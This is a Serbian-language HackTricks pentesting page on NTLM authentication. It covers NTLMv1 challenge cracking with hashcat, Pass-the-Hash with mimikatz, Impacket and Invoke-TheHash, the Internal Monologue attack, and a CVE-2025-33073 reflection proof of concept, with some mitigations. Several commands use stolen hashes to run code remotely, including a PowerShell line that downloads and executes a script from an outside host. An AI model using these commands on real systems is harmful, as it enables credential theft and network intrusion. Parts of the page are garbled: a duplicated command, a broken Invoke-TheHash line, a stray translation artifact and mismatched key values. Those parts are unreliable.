# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

U okruženjima u kojima se koriste **Windows XP i Server 2003**, koriste se LM (Lan Manager) hash-evi, iako je dobro poznato da se oni lako kompromituju. Određeni LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, ukazuje na to da se LM ne koristi i predstavlja hash praznog stringa.

Podrazumevano se prvenstveno koristi **Kerberos** protokol za autentifikaciju. NTLM (NT LAN Manager) se koristi u određenim okolnostima: kada nema Active Directory-ja, domen ne postoji, Kerberos ne radi zbog neispravne konfiguracije ili se veze uspostavljaju pomoću IP adrese umesto važećeg imena hosta.

Prisustvo zaglavlja **"NTLMSSP"** u mrežnim paketima ukazuje na proces NTLM autentifikacije.

Podršku za protokole za autentifikaciju LM, NTLMv1 i NTLMv2 pruža određeni DLL koji se nalazi na putanji `%windir%\Windows\System32\msv1\_0.dll`.

**Ključne tačke**:

- LM hash-evi su ranjivi, a prazan LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) ukazuje na to da se LM ne koristi.
- Kerberos je podrazumevani metod autentifikacije, dok se NTLM koristi samo pod određenim uslovima.
- NTLM paketi za autentifikaciju mogu se prepoznati po zaglavlju "NTLMSSP".
- Sistemska datoteka `msv1\_0.dll` podržava protokole LM, NTLMv1 i NTLMv2.

## LM, NTLMv1 i NTLMv2

Možete proveriti i konfigurisati koji će se protokol koristiti:

### GUI

Pokrenite _secpol.msc_ -> Lokalne smernice -> Bezbednosne opcije -> Mrežna bezbednost: nivo autentifikacije LAN Manager-a. Postoji 6 nivoa (od 0 do 5).

![LM, NTLMv1 i NTLMv2 - GUI: Pokrenite secpol.msc - Lokalne smernice - Bezbednosne opcije - Mrežna bezbednost: nivo autentifikacije LAN Manager-a. Postoji 6 nivoa (od 0 do 5)](<../../images/image (919).png>)

### Registry

Ovim se postavlja nivo 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Moguće vrednosti:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Osnovna šema NTLM autentifikacije domena

1. **Korisnik** unosi svoje **credentials**
2. Klijentska mašina **šalje zahtev za autentifikaciju** sa **nazivom domena** i **korisničkim imenom**
3. **Server** šalje **challenge**
4. **Klijent šifruje** **challenge** koristeći hash lozinke kao ključ i šalje ga kao response
5. **Server šalje** **Domain controller-u** **naziv domena, korisničko ime, challenge i response**. Ako **nije** konfigurisan Active Directory ili je naziv domena isti kao naziv servera, credentials se **proveravaju lokalno**.
6. **Domain controller proverava da li je sve ispravno** i šalje informacije serveru

**Server** i **Domain Controller** mogu da uspostave **Secure Channel** preko **Netlogon** servera, jer Domain Controller zna lozinku servera (nalazi se u **NTDS.DIT** bazi podataka).

### Šema lokalne NTLM autentifikacije

Autentifikacija je ista kao što je navedeno **iznad, ali** **server** zna **hash korisnika** koji pokušava da se autentifikuje, a koji se nalazi u **SAM** datoteci. Dakle, umesto da pita Domain Controller, **server će sam proveriti** da li korisnik može da se autentifikuje.

### NTLMv1 Challenge

**Dužina challenge-a je 8 bajtova**, a **response je dug 24 bajta**.

**NT hash (16 bajtova)** deli se na **3 dela od po 7 bajtova** (7B + 7B + (2B+0x00\*5)): **poslednji deo popunjava se nulama**. Zatim se **challenge** zasebno **šifruje** svakim delom, a **rezultujući** šifrovani bajtovi se **spajaju**. Ukupno: 8B + 8B + 8B = 24 bajta.

**Problemi**:

- Nedostatak **nasumičnosti**
- Tri dela mogu se **napadati zasebno** da bi se pronašao NT hash
- **DES može da se razbije**
- Treći ključ se uvek sastoji od **5 nula**.
- Ako je **challenge** isti, **response** će biti **isti**. Zato žrtvi možete poslati niz "**1122334455667788**" kao **challenge**, a zatim napasti response korišćenjem **precomputed rainbow tables**.

### NTLMv1 napad

Unconstrained delegation je ređi u modernim okruženjima, ali dostupan **Print Spooler service** i dalje može biti zloupotrebljen da bi se iznudio pokušaj autentifikacije ka takvom host-u.

Možete zloupotrebiti neke credentials/sessions koje već imate na AD-u da biste **naterali štampač da se autentifikuje** ka nekom **host-u pod vašom kontrolom**. Zatim, koristeći `metasploit auxiliary/server/capture/smb` ili `responder`, možete **podesiti authentication challenge na 1122334455667788**, uhvatiti pokušaj autentifikacije i, ako je korišćen **NTLMv1**, moći ćete da ga **razbijete**.\
Ako koristite `responder`, možete pokušati da **upotrebite flag `--lm`** kako biste pokušali da **smanjite nivo** **autentifikacije**.\
_Napomena: za ovu tehniku autentifikacija mora da se obavi korišćenjem NTLMv1 (NTLMv2 nije validan)._

Imajte na umu da će štampač tokom autentifikacije koristiti computer account, a computer accounts koriste **duge i nasumične lozinke** koje **verovatno nećete moći da razbijete** pomoću uobičajenih **rečnika**. Međutim, **NTLMv1** autentifikacija **koristi DES** ([više informacija ovde](#ntlmv1-challenge)), pa ćete moći da je razbijete pomoću nekih servisa namenjenih upravo razbijanju DES-a (na primer, možete koristiti [https://crack.sh/](https://crack.sh) ili [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 napad pomoću hashcat-a

NTLMv1 se može napasti i pomoću alata [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), koji pretvara uhvaćene NTLMv1 poruke u formate pogodne za Hashcat.<sup>[[1]](#references)</sup>

Komanda

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

prikazalo bi sledeće:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Nije dostavljen sadržaj za prevođenje.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Pokrenite hashcat (najbolje distribuirano, pomoću alata kao što je hashtopolis), jer će u suprotnom ovo trajati nekoliko dana.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

U ovom slučaju znamo da je lozinka za ovo password, pa ćemo varati radi demonstracije:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Sada treba da upotrebimo hashcat-utilities da bismo konvertovali razbijene DES ključeve u delove NTLM hash-a:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Konačno, poslednji deo:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Spojite ih:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

**Dužina challenge-a je 8 bajtova**, a šalju se **2 odgovora**: jedan je dužine **24 bajta**, a dužina **drugog** je **promenljiva**.

**Prvi odgovor** nastaje šifrovanjem **stringa** sastavljenog od **klijenta i domena** pomoću **HMAC_MD5**, pri čemu se kao **ključ** koristi **hash MD4** od **NT hash-a**. Zatim se **rezultat** koristi kao **ključ** za šifrovanje **challenge-a** pomoću **HMAC_MD5**. Ovome se dodaje **client challenge** od 8 bajtova. Ukupno: 24 B.

**Drugi odgovor** nastaje pomoću **nekoliko vrednosti** (novi client challenge, **vremenska oznaka** za sprečavanje **replay napada**...)

Ako imate **PCAP koji sadrži uspešnu razmenu pri autentifikaciji**, izdvojite domen, korisničko ime, server challenge i NTLMv2 response, formatirajte capture za Hashcat i upotrebite režim `5600` da pokušate da oporavite lozinku. Arhivirani praktični vodič zadržava postupak izdvajanja polja iz paketa, dok primeri za Hashcat definišu trenutno prihvaćeni format.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Kada imate hash žrtve**, možete da ga upotrebite da biste je **imitirali**.\
Potrebno je da upotrebite **alat** koji će **obaviti** **NTLM autentifikaciju pomoću** tog **hash-a**, **ili** možete da kreirate novi **sessionlogon** i **ubacite** taj **hash** u **LSASS**, tako da se taj **hash koristi** prilikom svake **NTLM autentifikacije**. To je poslednja opcija koju koristi mimikatz.

**Imajte na umu da Pass-the-Hash napade možete da izvodite i pomoću Computer naloga.**

### **Mimikatz**

**Mora se pokrenuti kao administrator**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Ovo pokreće proces pod trenutnim lokalnim korisnikom, dok LSASS povezuje navedene akreditive sa njegovom odlaznom mrežnom prijavom. Zatim možete pristupati mrežnim resursima kao navedeni korisnik, slično kao pomoću `runas /netonly`, bez poznavanja lozinke u otvorenom tekstu.

### Pass-the-Hash iz Linux-a

Možete dobiti izvršavanje koda na Windows mašinama koristeći Pass-the-Hash iz Linux-a.\
[**Pogledajte praktične primere izvršavanja Pass-the-Hash tehnike.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket kompajlirani alati za Windows

Možete preuzeti[ Impacket binarne datoteke za Windows ovde](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (U ovom slučaju morate navesti komandu; cmd.exe i powershell.exe nisu validni za dobijanje interaktivne ljuske)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Postoji još nekoliko Impacket binarnih datoteka...

### Invoke-TheHash

PowerShell skripte možete preuzeti ovde: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Ova funkcija objedinjuje prethodne režime. Možete proslediti **nekoliko hostova**, isključiti odabrane ciljeve i izabrati _SMBExec, WMIExec, SMBClient,_ ili _SMBEnum_. Ako izaberete **SMBExec** ili **WMIExec** bez parametra _**Command**_, funkcija samo proverava da li imate dovoljne dozvole.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Mora se pokrenuti kao administrator**

Ovaj alat radi isto što i mimikatz (menja memoriju LSASS-a).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Ručno udaljeno izvršavanje komandi na Windowsu pomoću korisničkog imena i lozinke


{{#ref}}
../lateral-movement/
{{#endref}}

## Izdvajanje akreditiva sa Windows hosta

Za više informacija pogledajte [**Krađa Windows akreditiva**](../stealing-credentials/README.md).

## Internal Monologue napad

Internal Monologue Attack je prikrivena tehnika izdvajanja akreditiva koja napadaču omogućava da preuzme NTLM hash-eve sa žrtvine mašine **bez direktne interakcije sa LSASS procesom**. Za razliku od Mimikatz-a, koji čita hash-eve direktno iz memorije i koji bezbednosna rešenja za krajnje uređaje ili Credential Guard često blokiraju, ovaj napad koristi **lokalne pozive NTLM paketu za autentifikaciju (MSV1_0) preko Security Support Provider Interface (SSPI)**. Napadač prvo **snižava NTLM podešavanja** (npr. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) kako bi omogućio NetNTLMv1. Zatim imitira postojeće korisničke tokene pribavljene iz pokrenutih procesa i pokreće NTLM autentifikaciju lokalno radi generisanja NetNTLMv1 odgovora pomoću poznatog izazova.<sup>[[4]](#references)</sup>

Nakon što uhvati ove NetNTLMv1 odgovore, napadač može brzo da povrati originalne NTLM hash-eve pomoću **unapred izračunatih rainbow tabela**, čime omogućava dalje Pass-the-Hash napade za lateralno kretanje. Važno je da Internal Monologue Attack ostaje prikriven jer ne generiše mrežni saobraćaj, ne ubacuje kod niti pokreće direktno ispisivanje memorije, pa ga je braniocima teže otkriti u poređenju sa tradicionalnim metodama poput Mimikatz-a.

Ako NetNTLMv1 nije prihvaćen zbog nametnutih bezbednosnih pravila, napadač možda neće uspeti da preuzme NetNTLMv1 odgovor.

Da bi se rešio ovaj slučaj, alat Internal Monologue je ažuriran: dinamički pribavlja serverski token pomoću `AcceptSecurityContext()` kako bi i dalje mogao da **uhvati NetNTLMv2 odgovore** ako NetNTLMv1 ne uspe. Iako je NetNTLMv2 mnogo teže razbiti, on i dalje otvara mogućnost za relay napade ili offline brute-force u ograničenim slučajevima.

PoC se može pronaći na **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay i Responder

**Pročitajte detaljniji vodič o izvođenju tih napada ovde:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parsiranje NTLM izazova iz mrežnog capture-a

**Možete koristiti** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM i Kerberos *Reflection* preko serijalizovanih SPN-ova (CVE-2025-33073)

Windows sadrži nekoliko mera zaštite koje pokušavaju da spreče *reflection* napade, u kojima se NTLM (ili Kerberos) autentifikacija koja potiče sa hosta prosleđuje nazad na **isti** host radi dobijanja SYSTEM privilegija.  

Microsoft je uklonio većinu javno poznatih lanaca napada zakrpama MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) i kasnijim zakrpama. Međutim, **CVE-2025-33073** pokazuje da se zaštita i dalje može zaobići zloupotrebom načina na koji **SMB klijent skraćuje Service Principal Names (SPN-ove)** koji sadrže *marshalled* (serijalizovane) ciljne informacije.<sup>[[5]](#references)[[6]](#references)</sup>

### Ukratko o grešci
1. Napadač registruje **DNS A-zapis** čija oznaka kodira marshalled SPN – npr.
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Žrtva se primorava da se autentifikuje na to ime hosta (PetitPotam, DFSCoerce itd.).
3. Kada SMB klijent prosledi ciljni string `cifs/srv11UWhRCAAAAA…` funkciji `lsasrv!LsapCheckMarshalledTargetInfo`, poziv funkcije `CredUnmarshalTargetInfo` **uklanja** serijalizovani blob, pa ostaje **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (ili ekvivalent za Kerberos) sada smatra da je cilj *localhost*, jer se kratki deo imena hosta poklapa sa imenom računara (`SRV1`).
5. Zbog toga server postavlja `NTLMSSP_NEGOTIATE_LOCAL_CALL` i ubacuje **LSASS-ov SYSTEM access-token** u kontekst (za Kerberos se kreira subsession key označen kao SYSTEM).
6. Prosleđivanje te autentifikacije pomoću `ntlmrelayx.py` **ili** `krbrelayx.py` daje puna SYSTEM prava na istom hostu.<sup>[[5]](#references)</sup>

### Brzi PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Zakrpe i mere za ublažavanje
* Zakrpa KB za **CVE-2025-33073** dodaje proveru u `mrxsmb.sys::SmbCeCreateSrvCall` koja blokira svaku SMB vezu čije odredište sadrži marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Nametnite **SMB signing** na odredištima za SMB relay. Za ostala odredišta procenite sopstvene zahteve tog protokola za signing ili Extended Protection, kao i nivo zakrpa; samo SMB signing ne određuje da li je moguć HTTPS WinRM relay.
* Pratite DNS zapise koji liče na `*<base64>...*` i blokirajte vektore za coercion (PetitPotam, DFSCoerce, AuthIP...).

### Ideje za detekciju
* Mrežni snimci sa `NTLMSSP_NEGOTIATE_LOCAL_CALL` gde se IP klijenta razlikuje od IP-ja servera.
* Kerberos AP-REQ koji sadrži subsession key i client principal jednak nazivu hosta.
* Windows događaji 4624/4648 sa SYSTEM prijavama, nakon kojih odmah slede udaljeni SMB upisi sa istog hosta.<sup>[[5]](#references)</sup>

Serijalizovano DNS ime sa informacijama o odredištu može da usmeri iznuđenu autentifikaciju ka napadaču radi **cross-protocol relay** napada na AD CS web enrollment endpoint. Ovo je drugačiji ishod od same-host reflection: uslove za [ESC8 enrollment](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), DNS write prava, putanju za coercion i nivo zakrpa na odredištu treba proceniti nezavisno.

Za varijantu lokalnog reflection napada iz **marta 2026**, koja zloupotrebljava **SMB arbitrary ports** i **TCP connection reuse** da bi dostigla `NT AUTHORITY\SYSTEM`, pogledajte:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat primeri hash-eva – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell alati za Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue napad: preuzimanje NTLM hash-eva bez pristupa LSASS-u](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection je mrtav, živeo NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Razbijanje NTLMv2 hash-a – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
